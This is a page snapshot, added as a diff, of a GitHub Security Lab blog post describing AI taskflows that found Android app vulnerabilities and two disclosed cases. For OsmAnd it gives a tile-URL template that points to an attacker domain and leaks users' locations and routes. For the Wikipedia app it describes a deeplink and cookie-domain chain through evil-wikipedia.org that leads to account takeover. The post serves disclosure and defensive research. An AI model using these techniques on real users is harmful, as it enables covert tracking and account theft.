@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'">
+<title>How we found 24 Android vulnerabilities using our open source AI security agent - AI热点快照</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;background:#f8f9fa;color:#1a1a2e;line-height:1.8;min-height:100vh}
+.top-bar{background:#fff;border-bottom:1px solid #e5e7eb;padding:10px 20px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:10}
+.top-bar .logo{font-size:14px;font-weight:700;color:#0d9488}
+.top-bar .sep{color:#d1d5db}
+.top-bar .source{font-size:13px;color:#6b7280}
+.top-bar .back{margin-left:auto;font-size:13px;color:#0d9488;text-decoration:none}
+.top-bar .back:hover{text-decoration:underline}
+.container{max-width:760px;margin:0 auto;padding:40px 24px 80px}
+.article-title{font-size:1.8rem;font-weight:700;line-height:1.35;margin-bottom:16px;color:#1a1a2e}
+.article-meta{display:flex;flex-wrap:wrap;gap:16px;padding-bottom:20px;margin-bottom:28px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#6b7280}
+.article-meta a{color:#0d9488;text-decoration:none}
+.article-meta a:hover{text-decoration:underline}
+.article-body{font-size:16.5px;line-height:1.85;color:#1f2937}
+.article-body p{margin-bottom:1.2em;text-align:justify}
+.article-body h1,.article-body h2,.article-body h3{font-size:1.25em;font-weight:700;margin:1.6em 0 0.6em;color:#1a1a2e}
+.article-body a{color:#0d9488}
+.article-body pre,.article-body code{background:#f1f5f9;border-radius:4px;font-size:0.9em}
+.article-body pre{padding:16px;overflow-x:auto;margin:1em 0}
+.article-body code{padding:2px 6px}
+.article-body blockquote{border-left:3px solid #0d9488;padding-left:16px;color:#4b5563;margin:1em 0}
+.article-body ul,.article-body ol{padding-left:1.6em;margin-bottom:1em}
+.article-body li{margin-bottom:0.4em}
+.article-body figure{margin:1.2em 0}
+.article-body figcaption{font-size:13px;color:#9ca3af;text-align:center;margin-top:6px}
+.footer{margin-top:48px;padding-top:20px;border-top:1px solid #e5e7eb;font-size:13px;color:#9ca3af;text-align:center}
+</style>
+</head>
+<body>
+<div class="top-bar">
+  <a class="back" href="../" style="font-size:13px;color:#6b7280;text-decoration:none">← 日报首页</a>
+  <span class="sep">|</span>
+  <span class="logo">AI热点快照</span>
+  <span class="sep">|</span>
+  <span class="source">The GitHub Blog</span>
+  <a class="back" href="https://github.blog/security/how-we-found-24-android-vulnerabilities-using-our-open-source-ai-security-agent/" target="_blank" rel="noopener noreferrer">查看原文 ↗</a>
+</div>
+<div class="container">
+  <h1 class="article-title">How we found 24 Android vulnerabilities using our open source AI security agent</h1>
+  <div class="article-meta">
+    <span>作者: Kevin Stubbings</span>
+    <span>来源: The GitHub Blog</span>
+    <span>快照日期: 2026-09-29</span>
+  </div>
+  <div class="article-body"><p>With the rise of AI in the security space, our team created the <a href="https://github.blog/security/community-powered-security-with-ai-an-open-source-framework-for-security-research/" target="_blank" rel="noopener noreferrer nofollow">GitHub Security Lab Taskflow Agent</a> as a way for security researchers to easily automate, package, and share the AI prompts and workflows that they find effective for their work. In this blog post, I’ll share how I created auditing taskflows to find vulnerabilities in Android applications.</p>
+
+
+
+<p>While new models are getting better at understanding code, custom taskflow prompts let security researchers guide them—splitting research into incremental steps to help the LLM find complex vulnerabilities faster, or that it would have missed entirely.</p>
+
+
+
+<p>Using these taskflows, I’ve reported more than 20 vulnerabilities in Android applications. You can check out our <a href="https://securitylab.github.com/ai-agents/" target="_blank" rel="noopener noreferrer nofollow">advisories page</a> to see when new vulnerabilities are disclosed. Otherwise, keep reading for a few concrete examples of high-impact vulnerabilities that these taskflows found.</p>
+
+
+
+<h2>How to run the taskflows on your own project</h2>
+
+
+
+<p>Want to get started right away? The taskflows are open source and easy to run yourself. Please note: A GitHub Copilot license is required, and the prompts will use premium model requests. Running the taskflows can result in many tool calls, which can easily consume a large amount of tokens.</p>
+
+
+
+<ol>
+<li>Go to the seclab-taskflows repository and start a codespace.</li>
+
+
+
+<li>Wait a few minutes for the codespace to initialize.</li>
+
+
+
+<li>In the terminal, run <code>./scripts/audit/run_mobile.sh myorg/myrepo</code></li>
+</ol>
+
+
+
+<p>It might take an hour or two to finish on a medium-sized repository. When it finishes, it’ll open an SQLite viewer with the results. Open the “audit_results” table and look for rows with a checkmark in the “has_vulnerability” column.</p>
+
+
+
+<h2>Creating targeted audit taskflows for Android apps</h2>
+
+
+
+<p>My colleagues Peter and Mo previously wrote a <a href="https://github.blog/security/how-to-scan-for-vulnerabilities-with-github-security-labs-open-source-ai-powered-framework/" target="_blank" rel="noopener noreferrer nofollow">blog post</a> about their audit task flows. Although those taskflows already work well on their own, Android applications have their own specific classes of vulnerabilities that we’d like the taskflows to focus on, so we need to guide them.</p>
+
+
+
+<p>First, I added a taskflow called <code>gather_mobile_entry_point_info.yaml</code>. Entry points are places in the code that attacker-controlled data could flow through. This taskflow takes the entry points and separates them into mobile entry points and non-mobile entry points. This allows the AI to run on repos that contain a variety of different application types—a mobile application, web servers, desktop applicationswhile still understanding the correct attack surface.</p>
+
+
+
+<p>Second, I edited <code>classify_application_local.yaml</code>. In it, I specify a list of popular vulnerability classes and ask the LLM to consider them in the context of each entry point and component. Since mobile application vulnerabilities are less widely known and LLMs are non-deterministic, we should ensure the LLM checks for certain essential vulnerabilities classes. For example, if in the previous step the taskflow identified an intent-based entry point, then it should have a list of common intent-based vulnerabilities it will check for, such as confused deputy or insecure broadcasts. This helps the LLM find connections between components and maintain an overview of the threat model.</p>
+
+
+
+<p>By combining both prompts across multiple runs, we get the best of each: the strict prompt and repeated runs ensure obvious vulnerabilities aren’t missed, while the broad prompt lets the AI apply its creativity to the fullest.</p>
+
+
+
+<h2>Two examples of vulnerabilities found by the taskflows</h2>
+
+
+
+<p>In this section, we’ll show two examples of vulnerabilities that were found by the taskflows and that have already been disclosed. In total, we have found and reported 24 vulnerabilities so far.</p>
+
+
+
+<h3>Tracking Users via OsmAnd</h3>
+
+
+
+<p>OsmAnd is a popular third-party navigation app that uses Open-Street-Map as its main data source. Available on both the App Store and Play Store, we will look at the Android version, which has over 10 million downloads. In this section, we will look at the most interesting of the three vulnerabilities that were discovered: a vulnerability that allows malicious apps to track the location of the device.</p>
+
+
+
+<p>OsmAnd exports an activity called MapActivity. An Android <em>activity</em> is a single, focused screen in an app that provides a UI for the user to interact with. MapActivity handles opening settings files and deeplinks within the app and is exported. An <em>exported activity</em> is an activity that can be launched by components outside of its own app.</p>
+
+
+
+<figure></figure>
+
+
+
+<p>However, when opening settings files, the app allows for intent extras (<code>settings_version</code>, <code>silent_import</code>, <code>replace</code>, <code>export_type_list_key</code>). <strong>Intents</strong> are messaging objects in Android used to request an action from another app component, and <strong>intent extras</strong> are key-value pairs of data attached to an intent to pass information along with that request. MapActivity only expects these extras to come from an AIDL service. They should have been passed through an in-process channel instead of intent extras, because <strong>any app can put arbitrary extras on any intent to any exported activity</strong>. Android provides no mechanism to restrict which extras an external caller can set.</p>
+
+
+
+<p>Because MapActivity is exported, any app can send an <a href="https://developer.android.com/reference/android/content/Intent" target="_blank" rel="noopener noreferrer nofollow">intent</a> to the activity with any <a href="https://developer.android.com/reference/android/content/Intent" target="_blank" rel="noopener noreferrer nofollow">extras</a> we want, including intent extras that can allow us to import settings to the app undetected. The Android app uses the handleOsmAndSettingsImport function to import the following settings:</p>
+
+
+
+<ul>
+<li>SilentImport: allows importing without a notification</li>
+
+
+
+<li>Replace: allows us to replace instead of just add settings</li>
+
+
+
+<li>SettingsTypes: allows us to import without a user confirmation</li>
+</ul>
+
+
+<div>
+<pre><code>private void handleOsmAndSettingsImport(Uri intentUri, String fileName, Bundle extras) { 
+    fileName = fileName.replace(ZIP_EXT, ""); 
+    if (extras != null &amp;&amp; CollectionUtils.containsAny(extras.keySet(), 
+            SETTINGS_VERSION_KEY, SETTINGS_LATEST_CHANGES_KEY)) { 
+        int version = extras.getInt(SETTINGS_VERSION_KEY, -1); 
+        String latestChanges = extras.getString(SETTINGS_LATEST_CHANGES_KEY); 
+        boolean replace = extras.getBoolean(REPLACE_KEY);              // ← attacker-controlled 
+        boolean silentImport = extras.getBoolean(SILENT_IMPORT_KEY);   // ← attacker-controlled 
+        ArrayList&lt;String&gt; exportTypeKeys = 
+            extras.getStringArrayList(EXPORT_TYPE_LIST_KEY);           // ← attacker-controlled 
+        List&lt;ExportType&gt; exportTypes = null; 
+        if (exportTypeKeys != null) { 
+            exportTypes = ExportType.valuesOf(exportTypeKeys); 
+        } 
+        handleOsmAndSettingsImport(intentUri, fileName, exportTypes, 
+            replace, silentImport, latestChanges, version); 
+    } else { 
+        handleOsmAndSettingsImport(intentUri, fileName, 
+            null, false, false, null, -1);                             // safe defaults 
+    } 
+} </code></pre>
+</div>
+
+
+<p>Since we can now import any settings we want, we can make several critical changes. For example, we can replace tiles on the map. OsmAnd formats the URL for each tile in the following format:</p>
+
+
+<div>
+<pre><code>return MessageFormat.format(urlTemplate, zoom + "", x + "", y + "");</code></pre>
+</div>
+
+
+<p>By default, OsmAnd uses local tiles, however we can overwrite the default tile files with the following URL:</p>
+
+
+<div>
+<pre><code>f"{ATTACKER_DOMAIN}/tiles/{{0}}/{{1}}/{{2}}.png",</code></pre>
+</div>
+
+
+<p>Then, we can leak the exact x, y coordinates of every tile. The URL expects the response of that URL to contain an image for the tile so on the attacker server backend, we serve the according tile from OpenStreetMaps. The attacker has a list of the x, y coordinates of every tile the user had loaded on the OsmAnd app, and the user has no idea the settings of their app have been changed. This allows any app, even one with no permissions, to overwrite the settings of OsmAnd and send back private location data to their server.</p>
+
+
+<div>
+<pre><code># [TILE #1]  14:23:07  z=15 x=9649 y=12320 
+#   ├── center: 40.70979, -73.98743 
+#   └── 🗺️  https://www.openstreetmap.org/#map=15/40.70979/-73.98743</code></pre>
+</div>
+
+
+<p>Using the same vulnerability, we can also obtain the origin and destination for every route a user takes on OsmAnd sent to our attacker server, without any change noticeable to the user.</p>
+
+
+<div>
+<pre><code>[ROUTE #1] 07:02:47  vehicle=car  waypoints=2 
+  ├── path: /osrm/car/-122.084,37.4219983;-122.32450103759766,37.99944305419922 
+  ├── 📍 ORIGIN:      37.421998, -122.084000 
+  │      https://www.openstreetmap.org/#map=15/37.42200/-122.08400 
+  ├── 🏁 DESTINATION: 37.999443, -122.324501 
+  │      https://www.openstreetmap.org/#map=15/37.99944/-122.32450</code></pre>
+</div>
+
+
+<h3>Wikipedia account takeover Via deeplink</h3>
+
+
+
+<p>Next, we’ll look at the Wikipedia Android app, which allows users to browse Wikipedia on their phones. To browse Wikipedia webpages within the app, the Wikipedia Android app registers a hook for the wikipedia:// deeplink to open the app. For example, a deeplink may look like <code>wikipedia://wikipedia.org/wiki/PoC</code> . However, a logic bug in the hostname parser allows us to load non-Wikipedia URLs.</p>
+
+
+<div>
+<pre><code>    private fun handleIntent(intent: Intent) { 
+        if (Intent.ACTION_VIEW == intent.action &amp;&amp; intent.data != null) { 
+            // TODO: handle special cases of non-article content, e.g. shared reading lists. 
+            intent.data?.let { 
+                if (it.authority.orEmpty().endsWith(WikiSite.BASE_DOMAIN)) { 
+                    // Pass it right along to PageActivity 
+                    val uri = Uri.parse(it.toString().replace("wikipedia://", WikiSite.DEFAULT_SCHEME + "://")) 
+                    startActivity(Intent(this, PageActivity::class.java) 
+                            .setAction(Intent.ACTION_VIEW) 
+                            .setData(uri)) 
+                } 
+            } 
+        } 
+    } </code></pre>
+</div>
+
+
+<p>This primitive allows us to direct the user to any website of our choosing using a wikipedia:// deeplink, and trick the user into thinking they are on the Wikipedia page, when they are, in fact, on an attacker-controlled page. Additionally, the attacker is able to run arbitrary JavaScript in the app’s WebView, a dangerous primitive that gives the attacker an entry point to environments that are normally considered safe. This vulnerability pattern occurs not once, but twice in the same app:</p>
+
+
+<div>
+<pre><code>// SharedPreferenceCookieManager.kt:101 
+if (domain.endsWith(domainSpec)) { 
+    buildCookieList(cookieList, cookiesForDomainSpec, null) 
+} </code></pre>
+</div>
+
+
+<p>This second snippet checks whether a page should contain cookies from wikipedia.org page. Using both issues, we can leak all the cookies from the Wikipedia page, which are long-lived.</p>
+
+
+
+<p>Chaining these two vulnerabilities together, we get a powerful account takeover.</p>
+
+
+
+<ol>
+<li>The victim accesses a malicious webpage on their browser containing a deeplink and clicks on it.</li>
+
+
+
+<li>The Wikipedia Android app opens automatically and loads an attacker-controlled page that ends with wikipedia.org, such as evil-wikipedia.org. The victim thinks it’s a page on Wikipedia, and the app automatically sends the user’s cookies. The attacker now has access to the victim’s username, long-lived token, and session token valid across every Wikimedia project (all Wikipedias, Commons, Wikidata, Meta, etc.).</li>
+</ol>
+
+
+
+<p>As these examples show, LLMs can find logic vulnerabilities with critical impact, not just generic bug classes.</p>
+
+
+
+<h2>LLMs are good at finding vulnerabilities but struggle at estimating severity</h2>
+
+
+
+<p>LLMs are good at finding vulnerabilities, even to the point of finding low severity bugs that are not very impactful. Many times, I found that the AI would return issues that required very specific states that would be almost impossible to find in real life situations. Additionally, it often reported low-severity vulnerabilities, even when specifically told not to do so. Because of this, each finding should be reviewed by a security researcher with knowledge of mobile applications.</p>
+
+
+
+<p>Another problem we found was that the severity of vulnerabilities was often estimated incorrectly. The actual impact of a vulnerability often changes due to mitigating factors; that lower its severity.</p>
+
+
+
+<p>Take for example a path traversal in an Android app where the filepath is restricted to the external storage; the relative severity of such an issue is low. Such mitigating factors are hard for the LLM to see without explicit prompting to “create a proof of concept,” requiring multiple runs not just for finding vulnerabilities, but also creating proof of concepts, which forces the LLM to try to exploit the vulnerability. Depending on the availability and speed of the model, this requires the model to use extra time on vulnerabilities that may not have very strong impact.</p>
+
+
+
+<p>Even then, the LLM can still get things wrong. For example, if the app uses data from both internal and external storage, the internal storage data is often given priority. The LLM may assume that data from external storage—which we can write to via our path traversal—will change the application’s actual data. But if internal storage overwrites our attacker-controlled external data, there’s no vulnerability at all. Such complex behaviors lead to false positives, which will decrease as LLM models’ contexts grow bigger and their reasoning improves. But for now, the only way to fix these issue is to give the LLM a debugger to run the proof of concept and original code, or for a researcher to prompt the LLM to look specifically for these issues.</p>
+
+
+
+<h2>LLMs have great knowledge of API behavior</h2>
+
+
+
+<p>Any security researcher who specializes in a particular language knows the common code patterns: which functions are safe and which are unsafe. For example, using <code>path.Clean</code> in Go is much less safe than using <code>filepath.Clean</code> and is often the cause of many vulnerabilities that affect Windows versions of popular products. We were surprised to see how well the LLM was able to understand the behavior of common security relevant APIs in various languages, even without access to the language source code. Most proof of concepts that we ask the LLM to produce after giving it a vulnerability report required little modification on our end, demonstrating its deep knowledge of previous security exploits and API behavior.</p>
+
+
+
+<h2>Notes on the results</h2>
+
+
+
+<p>At the time of writing this blog, we found 24 Android vulnerabilities in mobile applications. In many cases, we found simple vulnerabilities in applications such as path traversal. We found a handful of critical vulnerabilities, some of which have been presented in this blog post. Since Android app security is quite strong, the types of vulnerabilities are exactly where a security researcher would expect to find them, such as cross app scripting in a WebView, or exposed JavaScript bridges.</p>
+
+
+
+<figure></figure>
+
+
+
+<p>We believe that AI-powered security research is one of the best ways to secure open source projects currently, and its power can be used for web applications, mobile applications as well as desktop applications.</p>
+
+
+
+<h2>Closing</h2>
+
+
+
+<p>We strongly believe that security should be a top priority for all open source maintainers, and we know that AI will be an essential tool for all maintainers in the coming years, both for development and security. The <code><a href="https://github.com/GitHubSecurityLab/seclab-taskflow-agent" target="_blank" rel="noopener noreferrer nofollow">seclab-taskflow-agent</a></code> will help you get started with security in a couple minutes and is open to contributions for those who find interesting and unique prompts, tools and mechanisms for finding vulnerabilities with AI.</p>
+
+
+
+<p>Start securing your project today. Run these taskflows against your own app and take the first step toward AI-assisted security!</p>
+
+
+	
+	<h2>
+		Related posts	</h2>
+	
+
+
+<div>
+			<div>
+				<h2>We do newsletters, too</h2><p>Discover tips, technical guides, and best practices in our biweekly newsletter just for devs.</p>			</div>
+			<div>
+				<p>Your email address</p>
+			</div>
+		</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+  <div class="footer">
+    本文由 AI热点监控系统自动抓取 · 内容版权归原作者/网站所有<br>
+    快照仅用于学习交流，如需转载请访问原文
+  </div>
+</div>
+</body>
+</html>
